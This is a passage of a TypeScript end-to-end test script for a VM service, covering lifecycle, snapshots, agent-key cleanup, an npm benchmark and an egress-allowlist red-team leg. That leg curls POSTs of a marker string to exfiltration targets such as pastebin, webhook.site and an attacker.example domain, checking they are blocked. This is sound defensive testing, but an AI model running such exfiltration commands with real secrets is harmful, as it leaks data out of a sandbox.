    await timed("lcSnapshotDelete", async () => expectStatus(await call("DELETE", `/v1/snapshots/${encodeURIComponent(snapshotId)}`), [204], "DELETE snapshot"));
    expectStatus(await call("GET", `/v1/snapshots/${encodeURIComponent(snapshotId)}`), [404], "GET snapshot after delete");
    lifecycleSnapshots.delete(snapshotId);
    // A VM booted from a snapshot outlives the snapshot.
    proofs["snapshotVmOutlivesSnapshot"] = (await readMarker(fromSnapshot)) === marker;
  }

  await timed("lcDelete", async () => {
    for (const id of [...lifecycleVms]) {
      expectStatus(await call("DELETE", vmPath(id)), [204], "DELETE /v1/vms/<vm>");
      expectStatus(await call("GET", vmPath(id)), [404], "GET after delete");
      lifecycleVms.delete(id);
    }
  });
  for (const [name, value] of Object.entries(proofs)) if (value === false) failed.push(`lifecycleApi.${name}`);
}

/** The same verbs through the `cmux vm` CLI. */
async function lifecycleCli(failed: string[]): Promise<void> {
  const marker = `lifecycle-cli-${randomBytes(4).toString("hex")}`;
  const proofs: Record<string, unknown> = {};
  result["lifecycleCli"] = proofs;
  const idOf = (value: unknown, what: string) => {
    const id = field(value, "id");
    if (typeof id !== "string" || !VM_ID.test(id)) throw new Error(`cmux vm ${what} printed no VM id`);
    lifecycleVms.add(id);
    return id;
  };
  // A CLI create whose answer is lost is found again by its key (cleanup), since the CLI sets no autoDeleteSeconds.
  const cliKey = (label: string) => {
    const key = `lifecycle-cli-${label}-${runId}`;
    cliCreationKeys.add(key);
    return key;
  };
  const source = await timed("cliNew", async () =>
    idOf(await cliJson(["new", "--name", `lifecycle cli ${runId}`.slice(0, 100), "--idempotency-key", cliKey("source")], "new"), "new"));
  await timed("cliRunning", () => waitForState(source, "running", 5 * 60_000));
  await timed("cliExecWrite", async () => {
    const out = await cli(["exec", source, "--", `printf %s ${marker} > ${LIFECYCLE_FILE} && sync`]);
    if (out.code !== 0) throw new Error(`cmux vm exec exited ${out.code}: ${out.stderr.slice(0, 300)}`);
  });
  const cliRead = async (id: string) => {
    await awake(id);
    return (await cli(["exec", id, "--", `cat ${LIFECYCLE_FILE}`])).stdout.trim();
  };
  await timed("cliPause", () => cliJson(["pause", source], "pause"));
  await timed("cliPaused", () => waitForState(source, "paused", 3 * 60_000));
  await timed("cliResume", () => cliJson(["resume", source], "resume"));
  await timed("cliResumed", () => waitForState(source, "running", 3 * 60_000));
  proofs["fileAfterResume"] = (await cliRead(source)) === marker;
  await timed("cliStop", () => cliJson(["stop", source], "stop"));
  await timed("cliStopped", () => waitForState(source, "stopped", 5 * 60_000));
  await timed("cliStart", () => cliJson(["start", source], "start"));
  await timed("cliStarted", () => waitForState(source, "running", 5 * 60_000));
  proofs["fileAfterStopStart"] = (await cliRead(source)) === marker;
  const fork = await timed("cliFork", async () =>
    idOf(await cliJson(["fork", source, "--name", `lifecycle cli fork ${runId}`.slice(0, 100), "--idempotency-key", cliKey("fork")], "fork"), "fork"));
  await timed("cliForkRunning", () => waitForState(fork, "running", 5 * 60_000));
  proofs["fileInFork"] = (await cliRead(fork)) === marker;
  await awake(source);
  const snapshot = await cli(["snapshot", "create", source, "--name", `lifecycle cli ${runId}`.slice(0, 100), "--ttl", "3600", "--idempotency-key", `lifecycle-cli-snap-${runId}`, "--json"]);
  timings["cliSnapshotMs"] = snapshot.ms;
  if (snapshot.code !== 0 && /snapshot:write/i.test(snapshot.stderr)) {
    note("the key lacks snapshot:write; the CLI snapshot legs were skipped");
    proofs["snapshot"] = "skipped: no snapshot:write";
  } else {
    if (snapshot.code !== 0) throw new Error(`cmux vm snapshot create exited ${snapshot.code}: ${snapshot.stderr.slice(0, 300)}`);
    const snapshotId = field(JSON.parse(snapshot.stdout), "id");
    if (typeof snapshotId !== "string") throw new Error("cmux vm snapshot create printed no id");
    lifecycleSnapshots.add(snapshotId);
    await cliJson(["snapshot", "get", snapshotId], "snapshot get");
    const fromSnapshot = await timed("cliNewFromSnapshot", async () =>
      idOf(await cliJson(["new", "--snapshot", snapshotId, "--name", `lifecycle cli snap ${runId}`.slice(0, 100), "--idempotency-key", cliKey("from-snap")], "new --snapshot"), "new --snapshot"));
    await timed("cliFromSnapshotRunning", () => waitForState(fromSnapshot, "running", 5 * 60_000));
    proofs["fileInSnapshotVm"] = (await cliRead(fromSnapshot)) === marker;
    await timed("cliSnapshotDelete", async () => {
      const out = await cli(["snapshot", "delete", snapshotId, "--yes"]);
      if (out.code !== 0) throw new Error(`cmux vm snapshot delete exited ${out.code}: ${out.stderr.slice(0, 300)}`);
    });
    expectStatus(await call("GET", `/v1/snapshots/${encodeURIComponent(snapshotId)}`), [404], "GET snapshot after CLI delete");
    lifecycleSnapshots.delete(snapshotId);
  }
  await timed("cliRm", async () => {
    for (const id of [...lifecycleVms]) {
      const out = await cli(["rm", id, "--yes"]);
      if (out.code !== 0) throw new Error(`cmux vm rm exited ${out.code}: ${out.stderr.slice(0, 300)}`);
      expectStatus(await call("GET", vmPath(id)), [404], "GET after cmux vm rm");
      lifecycleVms.delete(id);
    }
  });
  for (const [name, value] of Object.entries(proofs)) if (value === false) failed.push(`lifecycleCli.${name}`);
}

/** The three ways a VM goes away when nobody is left to call DELETE. */
async function lifecycleCleanup(failed: string[]): Promise<void> {
  const proofs: Record<string, unknown> = {};
  result["lifecycleCleanup"] = proofs;

  // 1. autoDeleteSeconds 0: deleted as soon as it stops running (here: paused).
  const ephemeral = await timed("acCreate", () => lifecycleCreate("auto-delete", { autoDeleteSeconds: 0 }));
  await timed("acRunning", () => waitForState(ephemeral, "running", 5 * 60_000));
  expectStatus(await call("POST", `${vmPath(ephemeral)}/pause`, undefined, {}, 3 * 60_000), [200], "POST pause (auto-delete)");
  proofs["autoDeleteOnPause"] = await timed("acGoneAfterPause", () => waitGone(ephemeral, 10 * 60_000));

  // 2 and 3 need an agent key: the session's own credential.
  // An agent key takes only vm:read, vm:write and vm:exec (the defaults), so the journey's own key opens the
  // self-deleting VM's public egress (PUT .../public-egress, vm:network): a VM's network is private by default.
  const keyReply = await call("POST", "/v1/agent-keys", { name: `lifecycle ${runId}`.slice(0, 200), ttlSeconds: 1800, maxVms: 2, maxUsdPerHour: 2 });
  if (keyReply.status === 403) {
    note(`agent keys refused this credential (${keyReply.text.slice(0, 160)}); the self-delete and revoke legs were skipped`);
    proofs["selfDelete"] = proofs["revokeDeletes"] = "skipped: 403";
  } else {
    const keyBody = expectStatus(keyReply, [201], "POST /v1/agent-keys");
    const keyId = field(keyBody, "id");
    const agentKey = field(keyBody, "key");
    if (typeof keyId !== "string" || typeof agentKey !== "string") throw new Error("agent key answer has no id or key");
    if (process.env["GITHUB_ACTIONS"] === "true") console.log(`::add-mask::${agentKey}`);
    lifecycleAgentKeys.add(keyId);

    // 2. The VM deletes itself from inside, with the agent key it was given.
    const self = await timed("sdCreate", () => lifecycleCreate("self-delete", {}, agentKey));
    await timed("sdRunning", () => waitForState(self, "running", 5 * 60_000));
    const egressReply = await call("PUT", `${vmPath(self)}/public-egress`);
    const egress = egressReply.status >= 200 && egressReply.status < 300;
    if (!egress) note(`opening the self-deleting VM's egress answered ${egressReply.status} (${egressReply.text.slice(0, 160)})`);
    const keyFile = "/tmp/cmux-lifecycle-agent-key";
    // The key is short-lived (30 min) and revoked below; it goes in as an exec body, never printed.
    if (!/^[A-Za-z0-9_.-]+$/.test(agentKey)) throw new Error("agent key has unexpected characters");
    const wrote = await exec(self, `umask 077; printf %s ${agentKey} > ${keyFile} && echo ok`);
    if (wrote.stdout.trim() !== "ok") throw new Error("could not hand the agent key to the VM");
    const selfDelete = await timed("sdDelete", () =>
      exec(self, `curl -sS -o /dev/null -w '%{http_code}' -X DELETE -H "authorization: Bearer $(cat ${keyFile})" ${origin.origin}${vmPath(self)}`, 60_000).catch((error: unknown) => ({ exitCode: null, stdout: "", stderr: String(error) })));
    result["selfDeleteHttp"] = selfDelete.stdout.trim();
    result["selfDeleteEgress"] = egress;
    proofs["selfDelete"] = await timed("sdGone", () => waitGone(self, 3 * 60_000));

    // 3. The session ends: revoking its agent key deletes the key's VMs at once.
    const orphan = await timed("rvCreate", () => lifecycleCreate("revoke", {}, agentKey));
    await timed("rvRunning", () => waitForState(orphan, "running", 5 * 60_000));
    await timed("rvRevoke", async () => expectStatus(await call("DELETE", `/v1/agent-keys/${encodeURIComponent(keyId)}`), [200, 204], "DELETE /v1/agent-keys"));
    lifecycleAgentKeys.delete(keyId);
    proofs["revokeDeletes"] = await timed("rvGone", () => waitGone(orphan, 6 * 60_000));
  }
  for (const [name, value] of Object.entries(proofs)) if (value === false) failed.push(`lifecycleCleanup.${name}`);
}

// ---- The egress allowlist red team (--egress-allowlist) ----

/** An injected command that tries to send a secret out: every one must fail on an allowlisted VM. */
const EXFIL_TARGETS = [
  "https://example.com/",
  "https://webhook.site/",
  "https://pastebin.com/api/api_post.php",
  "http://203.0.113.7/",
  "https://1.1.1.1/",
  "http://1.1.1.1/",
  "https://[2606:4700:4700::1111]/",
  "https://api.anthropic.com.attacker.example/",
];
const ALLOWED_TARGETS = ["https://api.anthropic.com/v1/messages", "https://github.com/"];

async function egressAllowlistLeg(failed: string[]): Promise<void> {
  const proofs: Record<string, unknown> = {};
  result["egressAllowlist"] = proofs;
  const presets = ["anthropic", "openai", "github", "npm", "pypi"];
  const created = await timed("eaCreate", async () =>
    expectStatus(
      await call(
        "POST",
        "/v1/vms",
        {
          displayName: `egress allowlist ${runId}`.slice(0, 100),
          idleTimeoutSeconds: 300,
          autoDeleteSeconds: 3600,
          initialNetwork: { publicEgress: false, egress: { mode: "allowlist", presets, domains: [] } },
          labels: { purpose: "egress-redteam", run: runId.slice(0, 63), ...(useService ? { role: "chief" } : {}) },
        },
        { "idempotency-key": `egress-allowlist-${runId}` },
        5 * 60_000,
      ),
      [201],
      "POST /v1/vms (egress allowlist)",
    ));
  const id = field(created, "id");
  if (typeof id !== "string" || !VM_ID.test(id)) throw new Error("the allowlisted create returned no VM id");
  lifecycleVms.add(id);
  // The receipt names what was applied: required names, the presets' names, the caller's.
  const applied = field(field(created, "initialNetwork"), "allowedDomains");
  proofs["allowedDomains"] = applied ?? null;
  proofs["receiptConfirms"] = Array.isArray(applied) && applied.includes("api.anthropic.com") && !applied.includes("example.com");
  if (proofs["receiptConfirms"] !== true) failed.push("egressAllowlist.receiptConfirms");
  await timed("eaRunning", () => waitForState(id, "running", 5 * 60_000));
  const code = async (url: string, post: boolean) => {
    // A marker stands in for the secret; it is not one.
    const data = post ? `-X POST --data-binary cmux-egress-redteam-${runId}` : "";
    const out = await exec(id, `curl -sS -o /dev/null -w '%{http_code}' --max-time 12 ${data} '${url}' 2>/dev/null; true`, 60_000);
    return out.stdout.trim() || "000";
  };
  const reached: Record<string, string> = {};
  for (const url of ALLOWED_TARGETS) reached[url] = await timed(`eaAllowed ${url}`, () => code(url, false));
  const exfil: Record<string, string> = {};
  for (const url of EXFIL_TARGETS) exfil[url] = await timed(`eaExfil ${url}`, () => code(url, true));
  proofs["allowed"] = reached;
  proofs["exfil"] = exfil;
  // Allowed: any HTTP answer (api.anthropic.com answers 4xx without a key). Exfil: no HTTP answer at all.
  proofs["allowedReachable"] = Object.values(reached).every((c) => /^[1-5][0-9][0-9]$/.test(c));
  proofs["exfilBlocked"] = Object.values(exfil).every((c) => c === "000");
  for (const name of ["allowedReachable", "exfilBlocked"]) if (proofs[name] !== true) failed.push(`egressAllowlist.${name}`);
  expectStatus(await call("DELETE", vmPath(id)), [204, 404], "DELETE allowlisted VM");
  lifecycleVms.delete(id);
}

// ---- The registry-only lock against no lock: one big npm install (--npm-bench) ----

/** A real app's dependency set, big enough that the lock's per-connection cost would show: about 1,000 packages. */
const NPM_BENCH_PACKAGE = {
  name: "cmux-npm-bench",
  private: true,
  dependencies: {
    next: "15.5.4", react: "19.1.1", "react-dom": "19.1.1", typescript: "5.9.3", eslint: "9.36.0",
    "@babel/core": "7.28.4", webpack: "5.102.0", jest: "30.2.0", vite: "7.1.7", "@aws-sdk/client-s3": "3.899.0",
    "@mui/material": "7.3.3", lodash: "4.17.21", rxjs: "7.8.2", tailwindcss: "4.1.14", prettier: "3.6.2",
  },
};
const NPM_BENCH_ROUNDS = Number(process.env["NPM_BENCH_ROUNDS"] ?? "3");
const NPM_BENCH_BUDGET_MS = Number(process.env["NPM_BENCH_BUDGET_MS"] ?? "2000");

const median = (values: number[]): number => {
  const sorted = [...values].sort((a, b) => a - b);
  const mid = Math.floor(sorted.length / 2);
  return sorted.length % 2 ? sorted[mid]! : Math.round((sorted[mid - 1]! + sorted[mid]!) / 2);
};

async function npmBenchVm(kind: "locked" | "unlocked"): Promise<string> {
  const initialNetwork = kind === "locked"
    ? { publicEgress: false, egress: { mode: "allowlist", presets: ["npm"], domains: [] } }
    : { publicEgress: true };
  const created = expectStatus(
    await call(
      "POST",
      "/v1/vms",
      {
        displayName: `npm bench ${kind} ${runId}`.slice(0, 100),
        idleTimeoutSeconds: 300, // dev/test VMs cap idle at 300s; exec traffic keeps it awake
        autoDeleteSeconds: 3600,
        initialNetwork,
        labels: { purpose: "npm-bench", run: runId.slice(0, 63), ...(useService ? { role: "chief" } : {}) },
      },
      { "idempotency-key": `npm-bench-${kind}-${runId}` },
      5 * 60_000,
    ),
    [201],
    `POST /v1/vms (npm bench ${kind})`,
  );
  const id = field(created, "id");
  if (typeof id !== "string" || !VM_ID.test(id)) throw new Error(`the ${kind} npm bench create returned no VM id`);
  lifecycleVms.add(id);
  if (kind === "locked") {
    const applied = field(field(created, "initialNetwork"), "allowedDomains");
    result["npmBenchAllowedDomains"] = applied ?? null;
  }
  await waitForState(id, "running", 5 * 60_000);
  const pkg = Buffer.from(JSON.stringify(NPM_BENCH_PACKAGE)).toString("base64");
  const setup = await exec(id, `mkdir -p /tmp/npm-bench && cd /tmp/npm-bench && echo ${pkg} | base64 -d > package.json && npm --version`, 60_000);
  if (setup.exitCode !== 0) throw new Error(`npm bench ${kind}: no npm on the VM: ${setup.stderr.slice(0, 300)}`);
  return id;
}

/** One cold install, timed inside the VM so the exec round trip is not counted. */
async function npmBenchRound(id: string): Promise<{ ms: number; ok: boolean; tail: string }> {
  const out = await exec(
    id,
    "cd /tmp/npm-bench && rm -rf node_modules package-lock.json && c=$(mktemp -d) && s=$(date +%s%N) && " +
      "npm install --ignore-scripts --no-audit --no-fund --loglevel=error --cache \"$c\" >/tmp/npm-bench.log 2>&1; r=$?; " +
      "e=$(date +%s%N); echo \"$r $(( (e - s) / 1000000 )) $(ls node_modules | wc -l)\"",
    10 * 60_000,
  );
  const [code, ms, dirs] = out.stdout.trim().split(/\s+/);
  const tail = code === "0" ? `${dirs} top-level packages` : (await exec(id, "tail -c 400 /tmp/npm-bench.log", 30_000)).stdout;
  return { ms: Number(ms), ok: code === "0", tail };
}

async function npmBenchLeg(failed: string[]): Promise<void> {
  const proofs: Record<string, unknown> = {};
  result["npmBench"] = proofs;
  const [locked, unlocked] = await timed("nbCreate", () => Promise.all([npmBenchVm("locked"), npmBenchVm("unlocked")]));
  const reach = await exec(locked, "curl -sS -o /dev/null -w '%{http_code}' --max-time 12 https://example.com/ 2>/dev/null; true", 60_000);
  proofs["lockedReachesExample"] = reach.stdout.trim() || "000";
  if (proofs["lockedReachesExample"] !== "000") failed.push("npmBench.lockedIsOpen");
  const times: Record<"locked" | "unlocked", number[]> = { locked: [], unlocked: [] };
  for (let round = 0; round < NPM_BENCH_ROUNDS; round += 1) {
    // Alternate which side goes first so neither always meets a warmer registry edge.
    const order: Array<["locked" | "unlocked", string]> = round % 2 ? [["unlocked", unlocked], ["locked", locked]] : [["locked", locked], ["unlocked", unlocked]];
    for (const [kind, id] of order) {
      const r = await timed(`nb ${kind} ${round}`, () => npmBenchRound(id));
      if (!r.ok) {
        proofs[`${kind}Error`] = r.tail;
        failed.push(`npmBench.${kind}Install`);
        return;
      }
      proofs[`${kind}Packages`] = r.tail;
      times[kind].push(r.ms);
    }
  }
  proofs["lockedMs"] = times.locked;
  proofs["unlockedMs"] = times.unlocked;
  proofs["lockedMedianMs"] = median(times.locked);
  proofs["unlockedMedianMs"] = median(times.unlocked);
  proofs["deltaMs"] = median(times.locked) - median(times.unlocked);
  proofs["budgetMs"] = NPM_BENCH_BUDGET_MS;
  if ((proofs["deltaMs"] as number) > NPM_BENCH_BUDGET_MS) failed.push("npmBench.lockCostsTooMuch");
  for (const id of [locked, unlocked]) {
    expectStatus(await call("DELETE", vmPath(id)), [204, 404], "DELETE npm bench VM");
    lifecycleVms.delete(id);
  }
}

function summary(outcome: Record<string, unknown>): Record<string, unknown> {
  const error = typeof outcome["error"] === "string" ? { error: outcome["error"].replace(/\s+/g, " ").slice(0, 600) } : {};
  return {
    ...outcome,
    ...error,
    api: "cmux-vm",
    url: origin.origin,
    auth: sessionAuth ? "session" : useService ? "service" : "tenant",
    ...(sessionAuth ? { tenantVia: sessionAuth.via } : {}),
    durationMs: Math.round(performance.now() - runStartedAt),
    timings,
    notes,
    cleanupState,
  };
}

function emit(output: Record<string, unknown>): void {
  console.log(JSON.stringify(output, null, 2));
  if (resultFile) writeFileSync(resultFile, `${JSON.stringify(output)}\n`);
}

for (const signal of ["SIGINT", "SIGTERM"] as const) {
  process.on(signal, () => {
    console.error(`received ${signal}; cleaning up`);
    void cleanup().finally(() => {
      emit(summary({ ok: false, cancelled: true, stage, error: `cancelled by ${signal}`, ...result }));
      process.exit(130);
    });
  });
}

// The journey ends well inside the workflow's job timeout, so cleanup always runs.
// The lifecycle leg adds about 25 minutes of creates, forks, snapshots and waits.
const DEADLINE_MS = ((lifecycle ? 70 : 25) + (egressAllowlist ? 10 : 0) + (npmBench ? 25 : 0)) * 60_000;
const deadline = setTimeout(() => {
  console.error(`journey exceeded ${DEADLINE_MS}ms at stage ${stage}; cleaning up`);
  void cleanup().finally(() => {
    emit(summary({ ok: false, stage, error: `deadline exceeded during ${stage}`, ...result }));
    process.exit(1);
  });
}, DEADLINE_MS);

try {
  const failed: string[] = [];
  const health = await timed("health", () => call("GET", "/healthz"));
  expectStatus(health, [200], "GET /healthz");
  // First, so the number arrives even when a later leg fails.
  if (npmBench) await npmBenchLeg(failed);

  const marker = `dogfood-${randomBytes(4).toString("hex")}`;
  const displayName = `dogfood ${runId}`.slice(0, 100);
  const created = await timed("create", async () =>
    expectStatus(
      await call(
        "POST",
        "/v1/vms",
        {
          displayName,
          idleTimeoutSeconds: 300,
          autoDeleteSeconds: 3600,
          labels: { purpose: "dogfood", run: runId.slice(0, 63), ...(useService ? { role: "chief" } : {}) },
        },
        { "idempotency-key": `dogfood-${runId}` },
        5 * 60_000,
      ),
      [201],
      "POST /v1/vms",
    ));
  const id = field(created, "id");
  if (typeof id !== "string" || !/^vm_[0-9a-z]{26}$/.test(id)) throw new Error(`create returned no VM id: ${JSON.stringify(created).slice(0, 300)}`);
  vmId = id;
  result["vm"] = { id, state: field(created, "state"), resources: field(created, "resources"), creation: field(created, "creation") ?? null };
  if (field(created, "displayName") !== displayName) note(`create answered displayName ${JSON.stringify(field(created, "displayName"))}`);

  await timed("running", () => waitForState(id, "running", 5 * 60_000));

  const listed = await timed("list", async () => {
    const list = expectStatus(await call("GET", "/v1/vms"), [200], "GET /v1/vms");
    const items = field(list, "items");
    return (Array.isArray(items) ? items : []).find((vm) => field(vm, "id") === id);
  });
  if (!listed) throw new Error("the new VM is missing from GET /v1/vms");
  result["listedFields"] = Object.keys(listed as object).sort();

  await timed("firstExec", async () => {
    const out = await exec(id, `echo ${marker}-$((1+1))`);
    if (out.exitCode !== 0 || out.stdout.trim() !== `${marker}-2`) throw new Error(`first exec answered ${JSON.stringify(out).slice(0, 300)}`);
  });

  result["agents"] = await timed("agents", async () => {
    const out = await exec(
      id,
      "for f in /etc/profile.d/*.sh; do [ -r \"$f\" ] && . \"$f\"; done; for c in claude codex cmux; do printf '%s ' \"$c\"; ($c --version 2>/dev/null || echo missing) | head -1; done",
      60_000,
    );
    return Object.fromEntries(out.stdout.trim().split("\n").filter(Boolean).map((row) => {
      const [name, ...value] = row.split(" ");
      return [name, value.join(" ").trim()];
    }));
  });
  for (const [name, value] of Object.entries(result["agents"] as Record<string, string>)) {
    if (value === "missing") note(`${name} is not on PATH in the VM`);
  }

  // The terminal leg needs the vm:terminal scope; a key without it is a note, not a red.
  const terminalScope = await call("GET", `${vmPath(id)}/terminals`);
  const terminalLeg = terminalScope.status === 200;
  if (terminalScope.status === 403) note("the key lacks vm:terminal; the terminal legs were skipped");
  else if (!terminalLeg) throw new Error(`GET terminals expected 200/403, got ${terminalScope.status}: ${terminalScope.text.slice(0, 300)}`);
  const terminalName = "dogfood";
  if (terminalLeg) {
    const first = await timed("firstPrompt", () =>
      terminalRound(`${vmPath(id)}/terminal?name=${terminalName}&cols=120&rows=40`, `echo ${marker}-$((2+3))`, `${marker}-5`, 60_000));
    result["terminalCreated"] = first.created;
  }

  if (!skipSleep) {
    const pid = await timed("backgroundProcess", async () => {
      const out = await exec(id, "nohup sleep 86400 >/dev/null 2>&1 & echo $!");
      const value = out.stdout.trim();
      if (!/^[0-9]+$/.test(value)) throw new Error(`background process answered ${JSON.stringify(out).slice(0, 200)}`);
      return value;
    });
    const pausedTreeAt = pausedReads ? await timed("pausedTree", () => pausedTree(id)) : null;

    await timed("pause", async () => {
      expectStatus(await call("POST", `${vmPath(id)}/pause`, undefined, {}, 3 * 60_000), [200], "POST pause");
    });
    const pausedAt = performance.now();
    await timed("paused", () => waitForState(id, "paused", 3 * 60_000));
    result["statusAfterPauseSeries"] = await stateSeries(id, pausedAt, [1_000, 5_000, 15_000]);
    result["statusAfterPause"] = (result["statusAfterPauseSeries"] as Array<{ status: string }>).at(-1)?.status ?? "unknown";
    if (pausedTreeAt) await pausedReadsLeg(id, pausedTreeAt, failed);
    // Resume first, while the VM is surely paused: anything that reaches the VM (exec included) wakes it, and
    // resume on a VM that is no longer paused is 409 by design ("Only a paused VM can be resumed").
    await timed("resume", async () => {
      expectStatus(await call("POST", `${vmPath(id)}/resume`, undefined, {}, 5 * 60_000), [200], "POST resume");
    });
    await timed("runningAfterResume", () => waitForState(id, "running", 3 * 60_000));
    const alive = `kill -0 ${pid} 2>/dev/null && echo alive || echo gone`;
    result["memoryKept"] = await timed("memoryKept", async () => (await exec(id, alive)).stdout.trim() === "alive");
    if (result["memoryKept"] !== true) failed.push("memoryKept");

    // Then pause again and exec with no resume: the exec wakes the VM where it was, memory kept.
    await timed("pauseAgain", async () => {
      expectStatus(await call("POST", `${vmPath(id)}/pause`, undefined, {}, 3 * 60_000), [200], "POST pause (again)");
    });
    await timed("pausedAgain", () => waitForState(id, "paused", 3 * 60_000));
    const whilePaused = await timed("execWakes", () =>
      call("POST", `${vmPath(id)}/exec`, { command: alive, timeoutMs: 60_000 }, {}, 5 * 60_000));
    result["execWhilePausedStatus"] = whilePaused.status;
    if (whilePaused.status === 200) {
      result["memoryKeptOnExecWake"] = String(field(whilePaused.body, "stdout") ?? "").trim() === "alive";
      if (result["memoryKeptOnExecWake"] !== true) failed.push("memoryKeptOnExecWake");
    } else {
      // The exec failed: a red (exec should wake a paused VM). It may still have woken it; awake() resumes only a
      // VM that is still paused, so the rest of the journey runs.
      failed.push("execWakes");
      note(`exec on a paused VM answered ${whilePaused.status}, expected it to wake the VM and answer 200`);
      await awake(id);
    }
    await timed("runningAfterExecWake", () => waitForState(id, "running", 3 * 60_000));
  }

  if (terminalLeg) {
    // The client went away; a new one reattaches to the same named session.
    const again = await timed("restoredTerminal", () =>
      terminalRound(`${vmPath(id)}/terminals/${terminalName}`, `echo ${marker}-$((3+3))`, `${marker}-6`, 60_000));
    result["restoredScrollback"] = again.output.includes(`${marker}-5`);
    const sessions = await call("GET", `${vmPath(id)}/terminals`);
    const items = field(sessions.body, "items");
    result["terminalSessions"] = Array.isArray(items) ? items.filter((item) => field(item, "name") === terminalName).length : null;
    if (result["terminalSessions"] !== 1) note(`expected one "${terminalName}" terminal session, saw ${String(result["terminalSessions"])}`);
  }

  await timed("delete", async () => {
    expectStatus(await call("DELETE", vmPath(id)), [204], "DELETE /v1/vms/<vm>");
  });
  vmId = null;
  cleanupState = "completed";
  await timed("goneFromList", async () => {
    expectStatus(await call("GET", vmPath(id)), [404], "GET after delete");
    const list = expectStatus(await call("GET", "/v1/vms"), [200], "GET /v1/vms");
    if (JSON.stringify(list).includes(id)) note("the deleted VM is still listed");
  });

  if (egressAllowlist) await egressAllowlistLeg(failed);

  if (lifecycle) {
    await lifecycleApi(failed);
    const cliMissing = cliPath === "" ? "no --cmux or --cmux-vm binary" : await cliLacksVm();
    if (cliMissing !== null) note(`${cliMissing}; the CLI lifecycle legs were skipped`);
    else if (useService) note("a service key needs role=chief on every VM and `cmux vm` sets no labels; the CLI lifecycle legs were skipped");
    else await lifecycleCli(failed);
    await lifecycleCleanup(failed);
  }

  await cleanup();
  const output = summary({
    ok: failed.length === 0,
    ...(failed.length > 0 ? { stage: failed[0], error: `failed probes: ${failed.join(", ")}` } : {}),
    ...result,
  });
  if (failed.length > 0) process.exitCode = 1;
  emit(output);
} catch (error) {
  const message = error instanceof Error ? error.message : String(error);
  const failedStage = stage;
  await cleanup();
  emit(summary({ ok: false, ...result, stage: failedStage, error: message }));
  process.exitCode = 1;
} finally {
  clearTimeout(deadline);
  await cleanup();
}
